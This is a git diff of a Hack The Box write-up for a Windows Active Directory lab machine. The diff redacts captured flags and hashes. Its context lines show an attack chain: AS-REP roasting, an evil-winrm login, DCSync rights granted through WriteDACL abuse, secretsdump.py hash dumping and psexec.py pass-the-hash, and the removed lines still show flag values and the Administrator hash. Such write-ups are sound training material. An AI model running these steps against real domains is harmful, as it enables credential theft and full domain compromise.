@@ -11,11 +11,6 @@ tags: [hackthebox, windows, active-directory, asreproast, dcsync, exchange, writ
 
 Domain Controller with Exchange installed. LDAP allows anonymous bind, exposing all domain users. The service account `svc-alfresco` has Kerberos pre-authentication disabled (ASREPRoastable). After cracking the hash and getting a WinRM shell, nested group membership in Account Operators → Exchange Windows Permissions (WriteDACL on the domain object) is abused to grant DCSync rights, dumping all NTLM hashes.
 
-| Flag | Hash |
-|------|------|
-| user.txt | `81b7943c74055eb9b18fbead290f1a6c` |
-| root.txt | `b523a61208fb87b04ddabda38b4da4dd` |
-
 ---
 
 ## 1. Reconnaissance
@@ -71,7 +66,7 @@ john hash.txt --wordlist=rockyou.txt --format=krb5asrep
 ```bash
 evil-winrm -i 10.129.36.191 -u svc-alfresco -p s3rvice
 type C:\Users\svc-alfresco\Desktop\user.txt
-# 81b7943c74055eb9b18fbead290f1a6c
+# <hash>
 ```
 
 ---
@@ -107,18 +102,18 @@ Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
 
 ```bash
 secretsdump.py htb/john:'abc123!'@10.129.36.191
-# Administrator:500:...:32693b11e6aa90eb43d32c72a07ceea6:::
+# Administrator:500:...:<hash>:::
 ```
 
 **Step 4 — Pass-the-Hash:**
 
 ```bash
 psexec.py administrator@10.129.36.191 \
-  -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+  -hashes <hash>:<hash>
 # nt authority\system
 
 type C:\Users\Administrator\Desktop\root.txt
-# b523a61208fb87b04ddabda38b4da4dd
+# <hash>
 ```
 
 ---
